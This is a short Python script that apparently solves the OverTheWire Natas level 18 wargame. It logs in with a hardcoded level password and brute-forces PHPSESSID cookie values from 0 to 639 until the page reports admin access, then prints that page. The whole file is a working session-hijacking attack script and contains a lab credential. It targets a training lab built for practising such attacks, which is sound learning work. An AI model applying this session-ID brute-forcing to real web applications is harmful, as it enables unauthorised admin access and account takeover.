import requests


url = "http://natas18.natas.labs.overthewire.org/index.php"
pw = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
won = "You are an admin"

for i in range(640):
    s = requests.Session()
    s.auth = ('natas18', pw)
    cookie = {"PHPSESSID": str(i)}
    r = s.get(url, cookies=cookie)
    if won in r.text:
        print(r.text)
        break

